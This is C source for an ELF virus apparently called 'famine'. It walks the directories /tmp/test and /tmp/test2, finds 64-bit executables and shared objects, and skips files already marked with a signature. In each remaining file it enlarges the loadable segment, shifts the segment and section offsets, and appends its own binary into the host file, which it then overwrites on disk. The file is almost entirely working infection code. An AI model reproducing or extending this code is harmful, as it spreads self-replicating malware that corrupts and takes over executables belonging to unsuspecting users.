#include "famine.h"

int			get_size_needed(t_elf *elf, t_elf *virus_elf)
{
	Elf64_Phdr	*next;
	int		diff;

	//TODO: gérer si pas de next (aka inject.o -> inject SGF)
	next = elf->pt_load;
	if (elf->header->e_phnum > 1)
		diff = (virus_elf->size - (next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz)));
	else
		diff = (virus_elf->size - (elf->size - (elf->pt_load->p_offset + elf->pt_load->p_filesz)));
	return (diff);
}

void		*update_segment_sz(void *src, void **dst, Elf64_Phdr *segment, t_elf *virus_elf)
{
	uint64_t	p_filesz;
	uint64_t	p_memsz;

	memcpy(*dst, src, (unsigned long)&segment->p_filesz - (unsigned long)src);
	*dst += (unsigned long)&segment->p_filesz - (unsigned long)src;
	src = &segment->p_filesz;
	p_filesz = segment->p_filesz + virus_elf->size;
	memcpy(*dst, &p_filesz, sizeof(segment->p_filesz));
	*dst += sizeof(segment->p_filesz);
	src += sizeof(segment->p_filesz);
	p_memsz = segment->p_memsz + virus_elf->size;
	memcpy(*dst, &p_memsz, sizeof(segment->p_memsz));
	*dst += sizeof(segment->p_memsz);
	src += sizeof(segment->p_memsz);
	return (src);
}

void		*add_padding_segments(t_elf *elf, t_elf *virus_elf, void *src, void **dst, int nb_zero)
{
	int				size;
	Elf64_Off		shoff;

	size = get_size_needed(elf, virus_elf);
	shoff = elf->header->e_shoff + nb_zero + size;
	memcpy(*dst, src, (unsigned long)&elf->header->e_shoff - (unsigned long)src);
	*dst += (unsigned long)&elf->header->e_shoff - (unsigned long)src;
	memcpy(*dst, &shoff, sizeof(shoff));
	*dst += sizeof(shoff);
	src = (void *)&elf->header->e_shoff + sizeof(elf->header->e_shoff);
	for (int i = 0; i < elf->header->e_phnum; i++)
	{
		if (elf->segments[i].p_offset > (unsigned long)elf->pt_load->p_offset + elf->pt_load->p_filesz)
		{
			shoff = elf->segments[i].p_offset + nb_zero + size;
			memcpy(*dst, src, (unsigned long)&elf->segments[i].p_offset - (unsigned long)src);
			*dst += (unsigned long)&elf->segments[i].p_offset - (unsigned long)src;
			memcpy(*dst, &shoff, sizeof(shoff));
			*dst += sizeof(shoff);
			src = (void *)&elf->segments[i].p_offset + sizeof(elf->segments[i].p_offset);
		}
		else if ((unsigned long)&elf->segments[i] == (unsigned long)elf->pt_load)
			src = update_segment_sz(src, dst, elf->pt_load, virus_elf);
	}
	return (src);
}

void		*add_padding_sections(t_elf *elf, t_elf *virus_elf, void *src, void **dst, int nb_zero)
{
	int				size;
	Elf64_Off		shoff;

	size = get_size_needed(elf, virus_elf);
	for (int i = 0; i < elf->header->e_shnum; i++)
	{
		if ((unsigned long)elf->sections[i].sh_offset > elf->pt_load->p_offset + elf->pt_load->p_filesz)
		{
			shoff = elf->sections[i].sh_offset + nb_zero + size;
			memcpy(*dst, src, (unsigned long)&elf->sections[i].sh_offset - (unsigned long)src);
			*dst += (unsigned long)&elf->sections[i].sh_offset - (unsigned long)src;
			memcpy(*dst, &shoff, sizeof(shoff));
			*dst += sizeof(shoff);
			src = (void *)&elf->sections[i].sh_offset + sizeof(elf->sections[i].sh_offset);
		}
	}
	return (src);
}

void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
{
	void		*start;
	void		*src;
	void		*end;

	start = dst;
	src = elf->addr;
	end = src + elf->size;
//	memcpy(dst, elf->addr, elf->size);
//	memcpy(dst + elf->size, SIGNATURE, strlen(SIGNATURE));
	src = add_padding_segments(elf, virus_elf, src, &dst, nb_zero);
	int pt_load_size_left = ((unsigned long)elf->addr + elf->pt_load->p_offset + elf->pt_load->p_filesz) - (unsigned long)src;
	memcpy(dst, src, pt_load_size_left);
	dst += pt_load_size_left;
	src += pt_load_size_left;
	memcpy(dst, virus_elf->addr, virus_elf->size);
	dst += virus_elf->size;
	memset(dst, 0, nb_zero);
	dst += nb_zero;
	// TODO: fix for thin files like inject
	src += virus_elf->size - get_size_needed(elf, virus_elf);
	src = add_padding_sections(elf, virus_elf, src, &dst, nb_zero);
	memcpy(dst, src, (unsigned long)end - (unsigned long)src);
}

void	try_open_file(t_elf *virus_elf, char *file)
{
	int				ret;
	int				fd;
	t_elf			elf;
	void			*header[64];

	fd = open(file, O_RDWR);
	if (fd > 0)
	{
		ret = read(fd, header, 64);
		if (ret >= 0)
		{
			ret = check_magic_elf(header);
			if (ret == ET_EXEC || ret == ET_DYN)
			{
				ret = 0;
				elf.filename = file;
				elf.size = lseek(fd, (size_t)0, SEEK_END);
				if (elf.size < 0 ||
(elf.addr = mmap(NULL, elf.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
				{
					close(fd);
					if (DEBUG)
						debug_print_error(0, virus_elf->filename, file);
					return ;
				}
				if (!memmem(elf.addr, elf.size, SIGNATURE, strlen(SIGNATURE)))
				{
					if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
					{
						munmap(elf.addr, elf.size);
						close(fd);
						if (DEBUG)
							debug_print_error(ret, virus_elf->filename, file);
						return ;
					}
					int		size_needed = get_size_needed(&elf, virus_elf);
					int		nb_zero_to_add = PAGE_SIZE - (size_needed % PAGE_SIZE);
					if (DEBUG)
					{
						printf("previous size: %ld\n", elf.size);
						printf("size injection: %ld\n", virus_elf->size);
						printf("size_needed: %d\n", size_needed);
						printf("nb_zero_to_add: %d\n", nb_zero_to_add);
						printf("total addition: %d\n", size_needed + nb_zero_to_add);
						printf("final size: %ld\n", elf.size + size_needed + nb_zero_to_add);
					}
					char	*new = malloc(elf.size + size_needed + nb_zero_to_add);
					if (!new)
					{
						munmap(elf.addr, elf.size);
						close(fd);
						if (DEBUG)
							debug_print_error(ret, virus_elf->filename, file);
						return ;
					}
					create_infection(new, &elf, virus_elf, nb_zero_to_add);
					//
					munmap(elf.addr, elf.size);
					close(fd);
					fd = open(file, O_TRUNC | O_WRONLY);
					if (fd < 0)
						return ;
					write(fd, new, elf.size + size_needed + nb_zero_to_add);
					free(new);
				}
				else
					printf("%s already infected.\n", file);
			}
		}
		else if (DEBUG)
			debug_print_error(ret, virus_elf->filename, file);
		close(fd);
	}
}

void	moving_through_path(t_elf *virus_elf, char *path)
{
	DIR		*dir;
    struct	dirent *d;
	int		size;
	char	*new_path;

	dir = opendir(path);
	if (dir)
	{
		while ((d = readdir(dir)))
		{
			if (strcmp(d->d_name, ".") && strcmp(d->d_name, ".."))
			{
				size = strlen(path) + strlen(d->d_name) + 2;
				new_path = malloc(size);
				bzero(new_path, size);
				strcpy(new_path, path);
				strcat(new_path, "/");
				strcat(new_path, d->d_name);
				if (d->d_type == DT_DIR)
					moving_through_path(virus_elf, new_path);
				else
					try_open_file(virus_elf, new_path);
				free(new_path);
			}
		}
		closedir(dir);
	}
	else if (DEBUG)
		debug_print_error(0, virus_elf->filename, path);
}

int		main(int argc, char *argv[])
{
	int		fd;
	int		ret;
	t_elf	elf;

	ret = 0;
	if (DEBUG)
		debug_print_args(argc, argv);
	fd = open(argv[0], O_RDONLY);
	if (fd > 0)
	{
		/* TODO: Original infection
			Copy the whole file
		*/
		// TODO: Host infection
		elf.filename = argv[0];
		elf.size = lseek(fd, (size_t)0, SEEK_END);
		if (elf.size < 0 ||
(elf.addr = mmap(NULL, elf.size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		{
			close(fd);
			if (DEBUG)
				debug_print_error(0, argv[0], argv[0]);
			return (1);
		}
		if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
		{
			munmap(elf.addr, elf.size);;
			close(fd);
			if (DEBUG)
				debug_print_error(0, argv[0], argv[0]);
			return (1);
		}
		moving_through_path(&elf, "/tmp/test");
		moving_through_path(&elf, "/tmp/test2");
		munmap(elf.addr, elf.size);
		close(fd);
	}
	else if (DEBUG)
		debug_print_error(0, argv[0], argv[0]);
	return (0);
}
